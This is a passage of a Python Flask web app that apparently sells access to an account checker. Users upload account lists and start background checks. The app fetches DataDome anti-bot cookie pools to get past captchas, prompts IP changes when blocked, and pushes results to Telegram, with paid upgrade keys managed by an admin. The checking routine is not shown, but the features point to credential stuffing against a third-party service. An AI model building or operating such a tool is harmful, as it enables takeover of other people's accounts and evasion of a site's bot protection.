    current_user = next((u for u in users if u['username'] == session['user']['username']), None)
    if current_user:
        session['user'] = current_user
        session.modified = True
    else: # If user was deleted, log them out
        session.pop('user', None)
        return redirect(url_for('login'))
    
    user_session = get_or_create_user_session(session['user']['username'])
    if not user_session['status']['running'] and not user_session['status']['logs']:
         log_message(user_session, f"Welcome, {session['user']['username']}! The app is ready.", "text-info")

    bot_token, chat_id = load_telegram_config()
    return render_template('index.html', bot_token=bot_token or '', chat_id=chat_id or '', user=session['user'])

@app.route('/login', methods=['GET', 'POST'])
def login():
    if 'user' in session: return redirect(url_for('index'))
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        users = load_data(USERS_FILE)
        user = next((u for u in users if u['username'] == username), None)
        if user and check_password_hash(user['password_hash'], password):
            session['user'] = user
            flash('Logged in successfully!', 'success')
            return redirect(url_for('index'))
        else:
            flash('Invalid username or password.', 'danger')
    return render_template('login.html')

@app.route('/register', methods=['GET', 'POST'])
def register():
    if 'user' in session: return redirect(url_for('index'))
    if request.method == 'POST':
        username = request.form['username']
        email = request.form['email']
        password = request.form['password']
        confirm_password = request.form['confirm_password']
        if password != confirm_password:
            flash('Passwords do not match.', 'danger')
            return redirect(url_for('register'))
        users = load_data(USERS_FILE)
        if any(u['username'] == username for u in users):
            flash('Username already exists.', 'danger')
            return redirect(url_for('register'))
        new_user = {
            "username": username, "password_hash": generate_password_hash(password),
            "email": email, "upgrade_expires_at": None,
            "registered_at": datetime.now().isoformat()
        }
        users.append(new_user)
        save_data(users, USERS_FILE)
        flash('Registration successful! Please log in.', 'success')
        return redirect(url_for('login'))
    return render_template('register.html')

@app.route('/logout')
def logout():
    session.pop('user', None)
    flash('You have been logged out.', 'info')
    return redirect(url_for('login'))

@app.route('/start_check', methods=['POST'])
def start_check():
    if 'user' not in session: return jsonify({'status': 'error', 'message': 'Authentication required.'}), 401
    
    username = session['user']['username']
    user_session = get_or_create_user_session(username)

    with user_session['status_lock']:
        if user_session['status']['running']: 
            return jsonify({'status': 'error', 'message': 'A check is already running for your account.'}), 400
        
        user_session['status'].update({
            'running': True, 'progress': 0, 'total': 0, 'logs': [], 'stats': {},
            'final_summary': None, 'captcha_detected': False, 'stop_requested': False, 'current_account': ''
        })
        user_session['stop_event'].clear()
        user_session['captcha_pause_event'].clear()

    file = request.files.get('account_file')
    if not file or file.filename == '':
        flash('No account file selected.', 'danger')
        return redirect(url_for('index'))
    filename = secure_filename(file.filename)
    file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
    file.save(file_path)
    
    bot_token = request.form.get('telegram_bot_token')
    chat_id = request.form.get('telegram_chat_id')
    if 'save_telegram_creds' in request.form and bot_token and chat_id:
        save_telegram_config(user_session, bot_token, chat_id)
        
    cookie_module = request.form.get('cookie_module', 'ken_cookie')
    cookie_number = request.form.get('cookie_number', type=int, default=0)
    use_cookie_set = 'use_cookie_set' in request.form
    auto_delete = 'auto_delete' in request.form
    force_restart = 'force_restart' in request.form
    telegram_level_filter = request.form.get('telegram_level_filter', 'none')

    log_message(user_session, "Starting new check...", "text-info")
    
    thread = threading.Thread(target=run_check_task, args=(
        file_path, bot_token, chat_id, cookie_module, use_cookie_set, 
        auto_delete, force_restart, telegram_level_filter, cookie_number, 
        session['user'], user_session
    ))
    thread.daemon = True
    thread.start()
    user_session['thread'] = thread
    return redirect(url_for('index'))

@app.route('/status')
def get_status():
    if 'user' not in session: return jsonify({'status': 'error', 'message': 'Authentication required.'}), 401
    username = session['user']['username']
    user_session = get_or_create_user_session(username)
    with user_session['status_lock']:
        return jsonify(user_session['status'])

@app.route('/stop_check', methods=['POST'])
def stop_check_route():
    if 'user' not in session: return jsonify({'status': 'error', 'message': 'Authentication required.'}), 401
    username = session['user']['username']
    user_session = get_or_create_user_session(username)
    with user_session['status_lock']:
        if not user_session['status']['running']: 
            return jsonify({'status': 'info', 'message': 'Checker not running.'})
        user_session['status']['stop_requested'] = True
    
    user_session['stop_event'].set()
    if not user_session['captcha_pause_event'].is_set():
        user_session['captcha_pause_event'].set()
        
    log_message(user_session, "Stop request received. Shutting down gracefully...", "text-warning")
    return jsonify({'status': 'success', 'message': 'Stop signal sent.'})

@app.route('/captcha_action', methods=['POST'])
def captcha_action():
    if 'user' not in session: return jsonify({'status': 'error', 'message': 'Authentication required.'}), 401
    username = session['user']['username']
    user_session = get_or_create_user_session(username)
    action = request.form.get('action')
    log_message(user_session, f"Captcha action received: {action}", "text-info")
    
    if action == 'fetch_pool':
        new_pool = fetch_new_datadome_pool(user_session, num_cookies=5)
        if new_pool:
            log_message(user_session, f"Fetched {len(new_pool)} cookies. They will be saved for this session.", "text-info")
            for c in new_pool: save_datadome_cookie(user_session, c)
    elif action == 'retry_ip': log_message(user_session, "[IP] Assuming IP has been changed. Retrying...", "text-info")
    elif action == 'stop_checker': return stop_check_route()
    elif action == 'next_cookie': log_message(user_session, "[🔄] Attempting to use next available cookie.", "text-info")
    
    user_session['captcha_pause_event'].set()
    return jsonify({'status': 'success', 'message': 'Action processed.'})

@app.route('/redeem', methods=['POST'])
def redeem_key():
    if 'user' not in session: return jsonify({'status': 'error', 'message': 'Authentication required.'}), 401
    key_to_redeem = request.form.get('key')
    keys, users = load_data(KEYS_FILE), load_data(USERS_FILE)
    key_found = next((k for k in keys if k['key'] == key_to_redeem), None)
    if key_found and not key_found.get('redeemed_by'):
        duration_days = key_found.get('duration_days', 7)
        expiration_date = datetime.now() + timedelta(days=duration_days)
        key_found.update({'redeemed_by': session['user']['username'], 'redeemed_at': datetime.now().isoformat()})
        current_user = next((u for u in users if u['username'] == session['user']['username']), None)
        if current_user:
            current_user['upgrade_expires_at'] = expiration_date.isoformat()
            session['user'] = current_user
            session.modified = True
        save_data(keys, KEYS_FILE); save_data(users, USERS_FILE)
        flash(f'Key redeemed successfully! Your account has been upgraded for {duration_days} days.', 'success')
    else: flash('Invalid or already used key.', 'danger')
    return redirect(url_for('index'))

@app.route('/admin/generate_key', methods=['POST'])
def generate_key():
    if session.get('user', {}).get('username') != 'admin': return jsonify({"status": "error", "message": "Unauthorized"}), 403
    try: duration = int(request.json.get('duration', 7))
    except (ValueError, TypeError): duration = 7
    keys = load_data(KEYS_FILE)
    new_key_val = f"GCHK-{uuid.uuid4().hex[:12].upper()}"
    new_key = {"key": new_key_val, "duration_days": duration, "generated_by": "admin", "generated_at": datetime.now().isoformat(), "redeemed_by": None, "redeemed_at": None}
    keys.append(new_key); save_data(keys, KEYS_FILE)
    return jsonify({"status": "success", "key": new_key_val, "duration": duration})

@app.route('/admin/data', methods=['GET'])
def get_admin_data():
    if session.get('user', {}).get('username') != 'admin': return jsonify({"status": "error", "message": "Unauthorized"}), 403
    users, keys = load_data(USERS_FILE), load_data(KEYS_FILE)
    processed_users = []
    for u in users:
        user_copy = {k: v for k, v in u.items() if k != 'password_hash'}
        expires_at_str = u.get("upgrade_expires_at")
        if expires_at_str:
            try:
                expires_at = datetime.fromisoformat(expires_at_str)
                if expires_at > datetime.now():
                    time_left = expires_at - datetime.now()
                    days, remainder = divmod(time_left.total_seconds(), 86400)
                    hours, remainder = divmod(remainder, 3600)
                    minutes, _ = divmod(remainder, 60)
                    user_copy['status'] = 'Active'
                    user_copy['time_left'] = f"{int(days)}d {int(hours)}h {int(minutes)}m"
                else:
                    user_copy.update({'status': 'Expired', 'time_left': '---'})
            except (ValueError, TypeError):
                user_copy.update({'status': 'Free', 'time_left': '---'})
        else:
            user_copy.update({'status': 'Free', 'time_left': '---'})
        processed_users.append(user_copy)
    return jsonify({
        "users": sorted(processed_users, key=lambda x: x['registered_at'], reverse=True),
        "keys": sorted(keys, key=lambda x: x['generated_at'], reverse=True)
    })

@app.route('/admin/post_announcement', methods=['POST'])
def post_announcement():
    if session.get('user', {}).get('username') != 'admin': return jsonify({"status": "error", "message": "Unauthorized"}), 403
    data = request.json
    if not data.get('message'): return jsonify({"status": "error", "message": "Message cannot be empty."}), 400
    announcements = load_data(ANNOUNCEMENTS_FILE)
    new_announcement = {"id": uuid.uuid4().hex, "message": data['message'], "type": data.get('msg_type', 'info'), "timestamp": datetime.now().isoformat()}
    announcements.append(new_announcement); save_data(announcements, ANNOUNCEMENTS_FILE)
    return jsonify({"status": "success", "message": "Announcement posted."})

@app.route('/get_latest_announcement')
def get_latest_announcement():
    if 'user' not in session: return jsonify(None)
    announcements = load_data(ANNOUNCEMENTS_FILE)
    if not announcements: return jsonify(None)
    return jsonify(sorted(announcements, key=lambda x: x['timestamp'], reverse=True)[0])

@app.route('/results/<path:filename>')
def download_file(filename):
    if 'user' not in session: return redirect(url_for('login'))
    results_dir = get_results_directory()
    user_session = get_or_create_user_session(session['user']['username'])
    if not os.path.exists(os.path.join(results_dir, filename)):
        log_message(user_session, f"File not found. It may have been deleted by Vercel's ephemeral filesystem.", "text-danger")
        return "File not found. It may have been cleared from the server's temporary storage.", 404
    return send_from_directory(results_dir, filename, as_attachment=True)

if __name__ == '__main__':
    print("Starting Flask server for local development...")
    print("Access the interface at http://127.0.0.1:5000")
    app.run(host='127.0.0.1', port=5000, debug=True)